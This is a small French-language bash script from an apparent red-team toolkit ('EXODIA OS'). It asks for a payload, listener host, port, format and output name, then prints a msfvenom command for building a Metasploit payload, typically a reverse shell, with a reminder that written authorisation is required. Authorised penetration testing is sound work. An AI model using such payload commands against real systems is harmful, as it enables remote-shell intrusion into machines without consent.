#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}════════════════════════════════════════${NC}"
echo -e "${RED}🔴 EXODIA OS — Mode Red Team (génération de commande)${NC}"
echo -e "${BLUE}════════════════════════════════════════${NC}"
echo ""

read -p "Payload : " PAYLOAD
read -p "LHOST : " LHOST
read -p "LPORT [4444] : " LPORT
LPORT=${LPORT:-4444}
read -p "Format (exe,elf,python,raw) : " FORMAT
read -p "Nom du fichier de sortie : " OUTPUT

echo ""
echo -e "${YELLOW}📋 Copiez-collez cette commande dans un terminal :${NC}"
echo ""
echo -e "${GREEN}msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTPUT${NC}"
echo ""
echo -e "${RED}⚠️  RAPPEL LEGAL : Autorisation écrite obligatoire.${NC}"
echo -e "${BLUE}════════════════════════════════════════${NC}"
